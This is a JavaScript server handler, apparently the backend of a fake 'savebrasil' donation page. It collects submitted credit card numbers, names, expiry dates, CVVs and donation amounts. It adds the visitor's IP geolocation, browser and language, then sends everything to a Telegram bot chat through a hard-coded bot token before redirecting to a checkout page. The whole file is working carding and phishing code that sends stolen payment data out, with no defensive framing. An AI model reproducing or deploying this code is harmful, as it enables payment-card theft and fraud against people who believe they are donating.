export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Só POST' });
  }

  console.log('Body recebido:', req.body);

  const body = req.body || {};
  const {
    numero_cartao = '',
    nome_cartao = '',
    validade_cartao = '',
    cvv = '',
    valor_doacao = ''
  } = body;

  if (!numero_cartao || !cvv || !valor_doacao) {
    return res.status(400).send('Faltou campo');
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.headers['cf-connecting-ip'] || req.socket?.remoteAddress || 'desconhecido';
  console.log('IP:', ip);

  let ipInfo = { query: ip, city: 'N/A', regionName: 'N/A', country: 'N/A', isp: 'N/A' };
  try {
    const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=query,city,regionName,country,isp`);
    if (ipRes.ok) ipInfo = await ipRes.json();
  } catch (e) {
    console.error('ip-api erro:', e);
  }

  let navegador = 'Desconhecido';
  const ua = req.headers['user-agent'] || 'N/A';
  if (/Firefox/i.test(ua)) navegador = 'Firefox';
  else if (/Edg/i.test(ua)) navegador = 'Edge';
  else if (/Chrome/i.test(ua)) navegador = 'Chrome';
  else if (/Safari/i.test(ua)) navegador = 'Safari';
  else if (/OPR|Opera/i.test(ua)) navegador = 'Opera';

  const dataHora = new Date().toISOString().replace('T', ' ').split('.')[0];

  const conteudo = 
`🦆 | LOG┃doe.savebrasil.org.br

💳 | Número do Cartão: ${numero_cartao}
🔐 | Nome no Cartão: ${nome_cartao}
📅 | Validade: ${validade_cartao}
🔑 | Cvv/Cvc: ${cvv}
💰 | Valor da Doação: R$ ${valor_doacao}

🏠 | IP: ${ipInfo.query || ip}
🔎 | Cidade: ${ipInfo.city}
📍 | Região: ${ipInfo.regionName}
🌎 | País: ${ipInfo.country}
📦 | ISP: ${ipInfo.isp}

🔓 | USER-AGENT: ${ua}
🌐 | NAVEGADOR: ${navegador}
👥 | LINGUAGEM: ${req.headers['accept-language'] || 'N/A'}
📆 | DATA/HORA: ${dataHora}`;

  const botToken = '8249791748:AAHsushNFJnmQ_eh3QMx4ijxe8y8mVbZa9U';
  const chatId = '-1003615689623';

  const telegramUrl = `https://api.telegram.org/bot\( {botToken}/sendMessage?chat_id= \){chatId}&text=${encodeURIComponent(conteudo)}`;

  try {
    console.log('Enviando pro TG...');
    const tgRes = await fetch(telegramUrl);
    const tgText = await tgRes.text();
    console.log('TG resposta:', tgText);
    if (tgRes.ok) {
      return res.redirect(302, '/css/checkout.html');
    } else {
      return res.status(500).send('Erro TG: ' + tgText);
    }
  } catch (err) {
    console.error('Fetch TG fodeu:', err);
    return res.status(500).send('Erro total');
  }
}

